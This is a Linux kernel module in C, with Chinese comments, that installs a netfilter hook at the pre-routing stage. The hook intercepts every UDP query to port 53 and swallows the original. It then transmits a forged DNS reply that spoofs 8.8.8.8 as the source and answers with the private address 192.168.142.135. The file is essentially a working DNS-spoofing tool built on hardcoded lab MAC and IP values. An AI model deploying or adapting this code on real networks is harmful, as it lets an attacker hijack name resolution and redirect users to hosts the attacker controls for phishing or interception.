//linux kernel 3.13.0-43
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>//for ip header
#include <linux/types.h>
#include <linux/skbuff.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <net/icmp.h>
#include <linux/inet.h>

MODULE_LICENSE("Dual BSD/GPL");

#define ETH "ens37"
#define SIP "8.8.8.8"
#define DIP "192.168.142.131"
#define SPORT 53
#define DPORT 39804

#define NIPQUAD(addr)\
    ((unsigned char *)&addr)[0],\
    ((unsigned char *)&addr)[1],\
    ((unsigned char *)&addr)[2],\
    ((unsigned char *)&addr)[3]

unsigned char SMAC[ETH_ALEN] = {0x00,0x0C,0x29,0xF4,0x0A,0x2E};
unsigned char DMAC[ETH_ALEN] = {0x00,0x0C,0x29,0x19,0x14,0x20};

int8_t D_name[] =   //这个数组看不懂的话可以去查查DNS应答包字段
{
0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
0x00, 0x00, 0x00, 0x04, 0xc0, 0xa8, 0x8e, 0x87
};

static struct nf_hook_ops nfho;


//构建一个udp报文并发送
static int build_and_xmit_udp(char *eth, u_char *smac, u_char *dmac,
        u_char *pkt, int pkt_len, u_long sip, u_long dip,
        u_short sport, u_short dport,struct sk_buff *oldskb)
{
    struct sk_buff *skb = NULL;
    struct net_device *dev = NULL;
    struct udphdr *udph = NULL;
    struct iphdr *iph = NULL;
    struct ethhdr *ethdr = NULL;
    u_char *pdata = NULL;
    int nret = 1;
    uint8_t *p = NULL;
    uint16_t *p_data = NULL;
    pkt_len = oldskb->len -  28;
    if(NULL == smac || NULL == dmac)
        goto out;

    //根据设备名获得设备指针
    //这里调用的函数高版本做了修改，多了个参数struct net*
    if(NULL == (dev = dev_get_by_name(&init_net, eth)))
        goto out;

    //创建一个skb
    skb = alloc_skb(pkt_len + sizeof(struct udphdr) + sizeof(struct iphdr) + sizeof(struct ethhdr), GFP_ATOMIC);
    if(NULL == skb)
        goto out;

    //为skb预留空间，方便后面skb_buff协议封装
    skb_reserve(skb, pkt_len + sizeof(struct udphdr) + sizeof(struct iphdr) + sizeof(struct ethhdr));

    //skb字节填充
    skb->dev = dev;
    skb->pkt_type = PACKET_OTHERHOST;
    skb->protocol = __constant_htons(ETH_P_IP);
    skb->ip_summed = CHECKSUM_NONE;
    skb->priority = 0;

    //数据包封装
    //分别压入应用层，传输层，网络层，链路层栈帧
    //skb_push由后面往前面，与skb_put不同
    pdata = skb_push(skb, pkt_len);
    udph = (struct udphdr*)skb_push(skb, sizeof(struct udphdr));
    iph = (struct iphdr*)skb_push(skb, sizeof(struct iphdr));
    ethdr = (struct ethhdr*)skb_push(skb, sizeof(struct ethhdr));

    //应用层数据填充
    memcpy(pdata, (uint8_t *)oldskb->data+28, pkt_len);

    p = skb_put(skb, sizeof(D_name));
    if(NULL != p)
        memcpy(p, D_name, sizeof(D_name));

    struct iphdr *ipq = NULL;
    struct udphdr *udpq = NULL;
    ipq = ip_hdr(oldskb);
    udpq = (struct udphdr *)(ipq+1);



    //传输层udp数据填充
    memset(udph, 0, sizeof(struct udphdr));
    //udph->source = sport;
    //udph->dest = dport;
    udph->source = udpq->dest;
    udph->dest =  udpq->source;
    udph->len = htons(sizeof(struct udphdr) + pkt_len);//主机字节序转网络字节序
    udph->len = htons(ntohs(udph->len) + sizeof(D_name)); //报文长度
    udph->check = 0;//skb_checksum之前必须置0.协议规定

    p_data = (uint16_t *)(udph + 1);
    p_data[1] = htons(0x8580); //FLAGS，标准回复
    p_data[3] = htons(1); //AuswerRRs

    //网络层数据填充
    iph->version = 4;
    iph->ihl = sizeof(struct iphdr) >> 2;
    iph->frag_off = 0;
    iph->protocol = IPPROTO_UDP;
    iph->tos = 0;
    iph->daddr = dip;
    iph->saddr = sip;
    iph->ttl = 0x40;
    iph->tot_len = __constant_htons(skb->len - sizeof(struct ethhdr));
    iph->check = 0;
    iph->check = ip_fast_csum((unsigned char*)iph, iph->ihl);//计算校验和

    skb->csum = skb_checksum(skb, iph->ihl*4, skb->len - iph->ihl*4, 0);//skb校验和计算
    //udph->check = csum_tcpudp_magic(sip, dip, skb->len - iph->ihl*4, IPPROTO_UDP, skb->csum);//dup和tcp伪首部校验和

    //链路层数据填充
    memcpy(ethdr->h_dest, dmac, ETH_ALEN);
    memcpy(ethdr->h_source, smac, ETH_ALEN);
    ethdr->h_proto = __constant_htons(ETH_P_IP);

    //调用内核协议栈函数，发送数据包
    if(dev_queue_xmit(skb) < 0)
    {
        printk("dev_queue_xmit error\n");
        goto out;
    }
    nret = 0;//这里是必须的
    printk("dev_queue_xmit correct\n");
    //出错处理
out:
/*下面的0!=nret是必须的，前面即使不执行goto out，下面的语句程序也会执行， 如果不加0!=nret语句，那么前面dev_queue_xmit返回之后（已经kfree_skb一次了）， 再进入下面的语句第二次执行kfree_skb，就会导致系统死机*/
//关键在于知道dev_queue_xmit内部调用成功后，会kfree_skb，以及goto语句的作用

    if(0 != nret && NULL != skb)//这里前面的nret判断是必须的，不然必定死机
    {
        dev_put(dev);//减少设备的引用计数
        kfree_skb(skb);//销毁数据包
    }

    return nret;//F_ACCEPT;
}

atomic_t pktcnt = ATOMIC_INIT(0);//定义并初始化
//钩子函数，注意参数格式与开发环境源码树保持一致
static unsigned int hook_func(const struct nf_hook_ops *ops, 
        struct sk_buff *skb,
        const struct net_device *in,
        const struct net_device *out,
        int (*okfn)(struct sk_buff *))
{
   // struct iphdr *iph = ip_hdr(skb);
    int ret = NF_ACCEPT; 
    unsigned char *pdata = "hello kernel";

    // printk("hook function processing\n");

    // if(iph->protocol == IPPROTO_TCP)
    // {
    //     atomic_inc(&pktcnt);
    //     if(atomic_read(&pktcnt) % 5 == 0)
    //     {
    //         printk(KERN_INFO "Sending the %d udp packet\n", atomic_read(&pktcnt)/5);
    //         ret = build_and_xmit_udp(ETH, SMAC, DMAC, pdata, strlen(pdata), in_aton(SIP), in_aton(DIP), htons(SPORT), htons(DPORT),skb);
    //     }
    // }
    // return ret;

    struct iphdr *ip;
	struct udphdr *udp;
	uint8_t *p;
    struct  net_device	*dev    ;
	char  *name   ;
    	if (!skb)  {
        	return NF_ACCEPT;}

    	if(skb->protocol != htons(0x0800)) //排除ARP干扰
        	return NF_ACCEPT;

    	ip = ip_hdr(skb);
    	if(ip->protocol != 17){
        	return NF_ACCEPT;}

    	udp = (struct udphdr *)(ip+1);

    	if( (udp != NULL) && (ntohs(udp->dest) != 53) )
    	{
        	return NF_ACCEPT;
    	}else{
            ret = build_and_xmit_udp(ETH, SMAC, DMAC, pdata, strlen(pdata), in_aton(SIP), in_aton(DIP), htons(SPORT), htons(DPORT),skb);
            return NF_STOLEN;
	}

}

static int __init hook_init(void)
{
    nfho.hook = hook_func;//关联对应处理函数
    //nfho.hooknum = NF_INET_LOCAL_OUT;//ipv4的本地出口处
    nfho.hooknum = NF_INET_PRE_ROUTING;//ipv4的本地出口处
    nfho.pf = PF_INET;//ipv4，所以用这个
    nfho.priority = NF_IP_PRI_FIRST;//优先级，第一顺位

    nf_register_hook(&nfho);//注册

    return 0;
}

static void __exit hook_exit(void)
{
    nf_unregister_hook(&nfho);//注销
}

module_init(hook_init);
module_exit(hook_exit);
